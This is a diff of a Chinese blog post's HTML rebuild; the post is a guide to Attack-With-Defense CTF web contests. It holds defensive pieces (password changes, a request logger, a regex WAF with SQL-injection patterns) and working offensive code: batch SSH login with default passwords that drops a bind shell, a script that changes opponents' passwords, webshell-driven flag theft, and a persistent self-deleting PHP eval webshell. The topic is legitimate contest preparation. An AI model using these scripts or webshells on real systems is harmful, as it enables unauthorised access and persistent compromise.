@@ -1,6 +1,6 @@
-<!-- build time:Fri Jul 14 2023 16:59:33 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Awd-web"><link rel="canonical" href="https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/"><title>Awd-web小结 - Web | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Awd-web小结</h1><div class="meta"><span class="item" title="创建时间：2022-10-24 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-10-24T00:00:00+08:00">2022-10-24</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>17k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>15 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/107.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/27.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/t5yed1.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/88.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/3.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/94.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Web/" itemprop="item" rel="index" title="分类于 Web"><span itemprop="name">Web</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="查看比赛信息-规则"><a class="anchor" href="#查看比赛信息-规则">#</a> 查看比赛信息、规则</h2><p>注意赛方的限制比如说提交 flag 的间隔时间，flag 的获取方式，通防的限制，对后门的处理要求等要注意的点，避免 check 丢分</p><h2 id="改密码"><a class="anchor" href="#改密码">#</a> 改密码</h2><p>awd 模式每个队伍会有若干台服务器需要维护，如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面：</p><ul><li>ssh 连接密码即本地密码</li></ul><pre><code class="language-ABAP">passwd &#123;用户名&#125;
+<!-- build time:Fri Jul 14 2023 17:04:01 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Awd-web"><link rel="canonical" href="https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/"><title>Awd-web小结 - Web | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Awd-web小结</h1><div class="meta"><span class="item" title="创建时间：2022-10-24 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-10-24T00:00:00+08:00">2022-10-24</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>17k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>16 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/128.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/144.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/62.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/25.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/138.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/20.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Web/" itemprop="item" rel="index" title="分类于 Web"><span itemprop="name">Web</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="查看比赛信息、规则"><a href="#查看比赛信息、规则" class="headerlink" title="查看比赛信息、规则"></a>查看比赛信息、规则</h2><p>注意赛方的限制比如说提交flag的间隔时间，flag的获取方式，通防的限制，对后门的处理要求等要注意的点，避免check丢分</p><h2 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h2><p>awd模式每个队伍会有若干台服务器需要维护，如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面：</p><ul><li>ssh连接密码即本地密码</li></ul><pre><code class="ABAP">passwd &#123;用户名&#125;
 做修改即可
-</code></pre><ul><li>MySQL 登录密码</li></ul><pre><code class="language-apl">1. 使用 SET PASSWORD 命令
+</code></pre><ul><li>MySQL登录密码</li></ul><pre><code class="apl">1. 使用 SET PASSWORD 命令
 步骤 1)：输入命令mysql -u root -p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。
 
 步骤 2)：使用 SET PASSWORD 修改密码命令格式为 set password for username @localhost = password(newpwd);
@@ -16,21 +16,21 @@
 
 步骤 2)：输入use mysql;命令连接权限数据库。
 
-步骤 3)：输入命令update mysql.user set authentication_string=password('新密码') where user='用户名' and Host ='localhost';设置新密码。
+步骤 3)：输入命令update mysql.user set authentication_string=password(&#39;新密码&#39;) where user=&#39;用户名&#39; and Host =&#39;localhost&#39;;设置新密码。
 
 步骤 4)：输入 flush privileges; 命令刷新权限。
 
 步骤 5)：输入quit;命令退出 MySQL 重新登录，此时密码已经修改为刚才输入的新密码了。
-</code></pre><ul><li>后台的登录密码</li></ul><pre><code class="language-ASN.1">updata admin set user pass=’123456’;
-</code></pre><p>如果密码是默认的尝试别人的能否登录</p><pre><code class="language-python">#-*- coding:utf-8 -*-
+</code></pre><ul><li>后台的登录密码</li></ul><pre><code class="ASN.1">updata admin set user pass=’123456’;
+</code></pre><p>如果密码是默认的尝试别人的能否登录</p><pre><code class="python">#-*- coding:utf-8 -*-
 import paramiko
 
-ip = '192.168.1.137'
-port = '22'
-username = 'root'
-passwd = 'toor'
+ip = &#39;192.168.1.137&#39;
+port = &#39;22&#39;
+username = &#39;root&#39;
+passwd = &#39;toor&#39;
 # ssh 用户名 密码 登陆
-def ssh_base_pwd(ip,port,username,passwd,cmd='ls'):
+def ssh_base_pwd(ip,port,username,passwd,cmd=&#39;ls&#39;):
     port = int(port)
     ssh = paramiko.SSHClient()
 
@@ -50,7 +50,7 @@ def ssh_base_pwd(ip,port,username,passwd,cmd='ls'):
     
 a = ssh_base_pwd(ip,port,username,passwd)
 print(a)
-</code></pre><p>如果可以登录而且有 python 环境可以尝试使用下面这个 python 批量 ssh 登录并反弹 python shell</p><pre><code class="language-python">#-*- coding:utf-8 -*-
+</code></pre><p>如果可以登录而且有python环境可以尝试使用下面这个python批量ssh登录并反弹python shell</p><pre><code class="python">#-*- coding:utf-8 -*-
 import paramiko
 import threading
 import queue
@@ -79,13 +79,13 @@ def ssh_base_pwd(ip,port,username,passwd,cmd):
     return result.decode()
 
 def main(x):
-    shell = '''
+    shell = &#39;&#39;&#39;
     #服务器端
     import socket
     import os
     s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-    s.bind(('0.0.0.0',1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接
+    s.bind((&#39;0.0.0.0&#39;,1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接
     s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量
     con,addr=s.accept()     #接受一个客户端的连接
     #print(con,addr)
@@ -94,7 +94,7 @@ def main(x):
         cmd=con.recv(1024)
         print(cmd)
         command=cmd.decode()
-        if command.startswith('cd'):
+        if command.startswith(&#39;cd&#39;):
             os.chdir(command[2:].strip())   #切换路径
             result=os.getcwd()      #显示路径
         else:
@@ -102,20 +102,20 @@ def main(x):
         if result:
             con.send(result.encode())
         else:
-            con.send(b'OK!')
-    '''
-    cmd = 'echo \&quot;%s\&quot; &gt; ./shell.py' % (shell) +'&amp;&amp; python3 ./shell.py'
-    port = '22'
-    username = 'root'
-    passwd = 'toor'
+            con.send(b&#39;OK!&#39;)
+    &#39;&#39;&#39;
+    cmd = &#39;echo \&quot;%s\&quot; &gt; ./shell.py&#39; % (shell) +&#39;&amp;&amp; python3 ./shell.py&#39;
+    port = &#39;22&#39;
+    username = &#39;root&#39;
+    passwd = &#39;toor&#39;
     
-    ip = '192.168.1.&#123;&#125;'.format(x)
+    ip = &#39;192.168.1.&#123;&#125;&#39;.format(x)
     q.put(ip.strip(),block=True, timeout=None)
     ip_demo=q.get()
     #判断是否成功
     try:
         #lock.acquire()
-        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd='id')
+        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd=&#39;id&#39;)
         if res:
             print(&quot;[ + ]Ip: %s&quot; % ip_demo +&quot; is success!!! [ + ]&quot;)
             #lock.release()
@@ -139,7 +139,7 @@ for x in range(th_num):
         
 
 #q.join()所有任务完成
-</code></pre><p>我们改密码是为了防止被别人弱口令爆破，或者密码是默认的情况导致服务器丢失，这里我们也可以尝试去更改别人的密码</p><pre><code class="language-python">import paramiko
+</code></pre><p>我们改密码是为了防止被别人弱口令爆破，或者密码是默认的情况导致服务器丢失，这里我们也可以尝试去更改别人的密码</p><pre><code class="python">import paramiko
 import sys
 
 ssh_clients = []
@@ -169,7 +169,7 @@ class SSH_Client():
         stdin.write(&quot;%s\n&quot; % new_password)
         stdin.write(&quot;%s\n&quot; % new_password)
         stdout.read()
-        if &quot;success&quot; in stderr.read().decode('utf-8'):
+        if &quot;success&quot; in stderr.read().decode(&#39;utf-8&#39;):
             self.password = new_password
             return True
         else:
@@ -213,20 +213,20 @@ if __name__ == &quot;__main__&quot;:
         else:
             print(&quot; [+] %s (Failed!)&quot; % ssh_client.host)
     print(&quot; [+] something like interesting!!! &quot;)
-</code></pre><h2 id="下载源码备份"><a class="anchor" href="#下载源码备份">#</a> 下载源码，备份</h2><p>使用 ssh 工具保留源码，复制两份，用 d 盾去扫一份<br>以免网站崩溃的时候无法及时恢复，导致 check 丢分</p><h2 id="防御"><a class="anchor" href="#防御">#</a> 防御</h2><p>上面提到我们将源码 down 下来后利用 d 盾等工具扫描，将爆出来的 shell 注释修改或者删除等（具体怎么改根据比赛要求）</p><p>接着就是监控脚本</p><pre><code class="language-php">&lt;?php
+</code></pre><h2 id="下载源码，备份"><a href="#下载源码，备份" class="headerlink" title="下载源码，备份"></a>下载源码，备份</h2><p>使用ssh工具保留源码，复制两份，用d盾去扫一份<br>以免网站崩溃的时候无法及时恢复，导致check丢分</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>上面提到我们将源码down下来后利用d盾等工具扫描，将爆出来的shell注释修改或者删除等（具体怎么改根据比赛要求）</p><p>接着就是监控脚本</p><pre><code class="php">&lt;?php
 
 error_reporting(0); 
-define('LOG_FILEDIR','/tmp/loooooooogs');//日志文件目录
+define(&#39;LOG_FILEDIR&#39;,&#39;/tmp/loooooooogs&#39;);//日志文件目录
 if(!is_dir(LOG_FILEDIR))&#123;//如果目录不存在则创建
-	mkdir(LOG_FILEDIR);//创建目录
+    mkdir(LOG_FILEDIR);//创建目录
 &#125;
 function waf() 
 &#123; 
-if (!function_exists('getallheaders')) &#123; 
+if (!function_exists(&#39;getallheaders&#39;)) &#123; 
 function getallheaders() &#123; //获取所有的头信息
 foreach ($_SERVER as $name =&gt; $value) &#123; //循环获取所有的头信息
-if (substr($name, 0, 5) == 'HTTP_') 
-$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;//将头信息的名称替换为小写，并将下划线替换为空格
+if (substr($name, 0, 5) == &#39;HTTP_&#39;) 
+$headers[str_replace(&#39; &#39;, &#39;-&#39;, ucwords(strtolower(str_replace(&#39;_&#39;, &#39; &#39;, substr($name, 5)))))] = $value;//将头信息的名称替换为小写，并将下划线替换为空格
 &#125; 
 return $headers; 
 &#125; 
@@ -237,14 +237,14 @@ $cookie = $_COOKIE; //获取cookie参数
 $header = getallheaders(); //获取所有的头信息
 $files = $_FILES; //获取所有的上传文件信息
 $ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //获取客户端ip
-$method = $_SERVER['REQUEST_METHOD']; //获取请求方式
+$method = $_SERVER[&#39;REQUEST_METHOD&#39;]; //获取请求方式
 $filepath = $_SERVER[&quot;SCRIPT_NAME&quot;]; //获取文件路径
 foreach ($_FILES as $key =&gt; $value) &#123; //循环获取所有的上传文件信息
-$files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); // 获取文件内容
-file_put_contents($_FILES[$key]['tmp_name'], &quot;virink&quot;); //写入文件
+$files[$key][&#39;content&#39;] = file_get_contents($_FILES[$key][&#39;tmp_name&#39;]); // 获取文件内容
+file_put_contents($_FILES[$key][&#39;tmp_name&#39;], &quot;virink&quot;); //写入文件
 &#125;
 
-unset($header['Accept']);//删除头信息中的Accept
+unset($header[&#39;Accept&#39;]);//删除头信息中的Accept
 $input = array(&quot;Get&quot;=&gt;$get, &quot;Post&quot;=&gt;$post, &quot;Cookie&quot;=&gt;$cookie, &quot;File&quot;=&gt;$files, &quot;Header&quot;=&gt;$header);//将所有的参数合并成一个数组
 
 logging($input);//调用日志函数
@@ -252,20 +252,20 @@ logging($input);//调用日志函数
 &#125;
 
 function logging($var)&#123; //日志函数
-$filename = $_SERVER['REMOTE_ADDR'];//获取客户端ip
+$filename = $_SERVER[&#39;REMOTE_ADDR&#39;];//获取客户端ip
 $LOG_FILENAME = LOG_FILEDIR.&quot;/&quot;.$filename;//日志文件路径
 $time = date(&quot;Y-m-d G:i:s&quot;);//获取当前时间
 file_put_contents($LOG_FILENAME, &quot;\r\n&quot;.$time.&quot;\r\n&quot;.print_r($var, true), FILE_APPEND); //写入日志文件
 
-file_put_contents($LOG_FILENAME,&quot;\r\n&quot;.'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);//写入日志文件
+file_put_contents($LOG_FILENAME,&quot;\r\n&quot;.&#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;PHP_SELF&#39;].&#39;?&#39;.$_SERVER[&#39;QUERY_STRING&#39;], FILE_APPEND);//写入日志文件
 
 file_put_contents($LOG_FILENAME,&quot;\r\n***************************************************************&quot;,FILE_APPEND);//写入日志文件
 &#125;
 
 waf(); 
 ?&gt;
-</code></pre><p>如果可以我们还可以上通防（一般都是不行）</p><pre><code class="language-php">&lt;!-- 
-require_once('waf.php')
+</code></pre><p>如果可以我们还可以上通防（一般都是不行）</p><pre><code class="php">&lt;!-- 
+require_once(&#39;waf.php&#39;)
 
 PHPCMS V9 \phpcms\base.php
 PHPWIND8.7 \data\sql_config.php
@@ -278,61 +278,61 @@ Metinfo   \include\head.php
 &lt;?php
 
 function customError($errno, $errstr, $errfile, $errline) &#123;
-	echo &quot;&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;&quot;;
-	die();
+    echo &quot;&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;&quot;;
+    die();
 &#125;
 
 set_error_handler(&quot;customError&quot;, E_ERROR);
-$getfilter=&quot;'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
+$getfilter=&quot;&#39;|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
 $postfilter=&quot;\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
 $cookiefilter=&quot;\\b(and|or)\\b.&#123;1.6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
 function DefendAttack($StrFiltKey, $StrFiltValue, $ArrFiltReq) &#123;
-	if(is_array($StrFiltValue)) &#123;
-		$StrFiltValue = implode($StrFiltValue);
-	&#125;
-	if(preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;, $StrFiltValue)==1) &#123;
-		//slog(&quot;&lt;br&gt;&lt;br&gt;操作IP: &quot;.$_SERVER[&quot;REMOTE_ADDR&quot;].&quot;&lt;br&gt;操作时间: &quot;.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;).&quot;&lt;br&gt;操作页面: &quot;.$_SERVER[&quot;PHP_SELF&quot;].&quot;&lt;br&gt;提交方式: &quot;.$_SERVER[&quot;REQUEST_METHOD&quot;].&quot;&lt;br&gt;提交参数: &quot;.$StrFiltKey.&quot;&lt;br&gt;提交参数: &quot;.$StrFiltValue);
-		print &quot;360WebSec notice: Illegal operation!&quot;;
-		exit();
-	&#125;
+    if(is_array($StrFiltValue)) &#123;
+        $StrFiltValue = implode($StrFiltValue);
+    &#125;
+    if(preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;, $StrFiltValue)==1) &#123;
+        //slog(&quot;&lt;br&gt;&lt;br&gt;操作IP: &quot;.$_SERVER[&quot;REMOTE_ADDR&quot;].&quot;&lt;br&gt;操作时间: &quot;.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;).&quot;&lt;br&gt;操作页面: &quot;.$_SERVER[&quot;PHP_SELF&quot;].&quot;&lt;br&gt;提交方式: &quot;.$_SERVER[&quot;REQUEST_METHOD&quot;].&quot;&lt;br&gt;提交参数: &quot;.$StrFiltKey.&quot;&lt;br&gt;提交参数: &quot;.$StrFiltValue);
+        print &quot;360WebSec notice: Illegal operation!&quot;;
+        exit();
+    &#125;
 &#125;
 //$ArrPGC = array_merge($_GET, $_POST, $_COOKIE);
 foreach ($_GET as $key =&gt; $value) &#123;
-	DefendAttack($key, $value, $getfilter);
+    DefendAttack($key, $value, $getfilter);
 &#125;
 foreach ($_POST as $key =&gt; $value) &#123;
-	DefendAttack($key, $value, $postfilter);
+    DefendAttack($key, $value, $postfilter);
 &#125;
 foreach ($_COOKIE as $key =&gt; $value) &#123;
-	DefendAttack($key, $value, $cookiefilter);
+    DefendAttack($key, $value, $cookiefilter);
 &#125;
 
 if (file_exists(filename)) &#123;
-	# code...
+    # code...
 &#125;
 
 function slog($logs) &#123;
-	$toppath = $_SERVER[&quot;DOCUMENT_ROOT&quot;].&quot;/log.htm&quot;;
-	$Ts=fopen($toppath, &quot;a+&quot;);
-	fputs($Ts, $logs.&quot;\r\n&quot;);
-	fclose($Ts);
+    $toppath = $_SERVER[&quot;DOCUMENT_ROOT&quot;].&quot;/log.htm&quot;;
+    $Ts=fopen($toppath, &quot;a+&quot;);
+    fputs($Ts, $logs.&quot;\r\n&quot;);
+    fclose($Ts);
 &#125;
 
 ?&gt;
-</code></pre><p>对于别人上传过来的不死马进行处理</p><ul><li>杀死进程，可以使用 ps aux 命令 列出所有进程，找到要杀掉的进程运用命令，kill pid 就可以了</li><li>通过条件竞争写入无效内容或者删除不死马文件，代码如下（竞争写入无关内容，config 是木马名）</li></ul><pre><code class="language-php">&lt;?php
+</code></pre><p>对于别人上传过来的不死马进行处理</p><ul><li>杀死进程，可以使用 ps aux 命令 列出所有进程，找到要杀掉的进程运用命令，kill pid 就可以了</li><li>通过条件竞争写入无效内容或者删除不死马文件，代码如下（竞争写入无关内容，config是木马名）</li></ul><pre><code class="php">&lt;?php
     ignore_user_abort(true);
     set_time_limit(0);
     unlink(__FILE__);
-    $file = '.config.php';
-    $code = '???';
+    $file = &#39;.config.php&#39;;
+    $code = &#39;???&#39;;
     //pass=pass
     while (1)&#123;
         file_put_contents($file,$code);
-        system('touch -m -d &quot;2018-12-01 09:10:12&quot; .config.php');
+        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .config.php&#39;);
         usleep(50);
     &#125;
 ?&gt;
-</code></pre><p>当然最好的防御还是攻击</p><h2 id="利用漏洞攻击"><a class="anchor" href="#利用漏洞攻击">#</a> 利用漏洞攻击</h2><p>d 盾扫出来的 shell 只要手快还是可以先打一波的，可以在赛前提前写好简单的 shell 利用批量化脚本</p><pre><code class="language-python">import fontTools.afmLib
+</code></pre><p>当然最好的防御还是攻击</p><h2 id="利用漏洞攻击"><a href="#利用漏洞攻击" class="headerlink" title="利用漏洞攻击"></a>利用漏洞攻击</h2><p>d盾扫出来的shell只要手快还是可以先打一波的，可以在赛前提前写好简单的shell利用批量化脚本</p><pre><code class="python">import fontTools.afmLib
 import requests
 import json
 import re
@@ -348,7 +348,7 @@ header2 = &#123;
 url2 = &quot;&quot;
 while True:
     for i in data:
-        urlpro=&quot;http://&#123;&#125;/.a.php?c=system('cat /flag.txt');&quot;.format(i)
+        urlpro=&quot;http://&#123;&#125;/.a.php?c=system(&#39;cat /flag.txt&#39;);&quot;.format(i)
         res=requests.get(urlpro)
         #print(urlpro)
         p=re.compile(&quot;flag.*&#125;&quot;)
@@ -358,21 +358,21 @@ while True:
         # print(paylaod2)
         # post请求
         res2 = requests.post(url2, paylaod2, headers=header2)
-</code></pre><p>当然这样可能只能拿到一轮的分数，所以我们可以上传不死马，下面是一个常用的 MD5 不死马</p><pre><code class="language-php">&lt;?php
+</code></pre><p>当然这样可能只能拿到一轮的分数，所以我们可以上传不死马，下面是一个常用的MD5不死马</p><pre><code class="php">&lt;?php
     ignore_user_abort(true);//设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。
     set_time_limit(0);//设置脚本最大执行时间，这里设置为0，即没有时间方面的限制
     unlink(__FILE__);//删除文件本身，以起到隐蔽自身的作用
-    $file = '.config.php';
-    $code = '&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[xcu]);&#125; ?&gt;';
+    $file = &#39;.config.php&#39;;
+    $code = &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[xcu]);&#125; ?&gt;&#39;;
     //pass=pass
     while (1)&#123;
         file_put_contents($file,$code);
-        system('touch -m -d &quot;2018-12-01 09:10:12&quot; .config2.php');
-		system('chmod 777 .config.php');
+        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .config2.php&#39;);
+        system(&#39;chmod 777 .config.php&#39;);
         usleep(0);
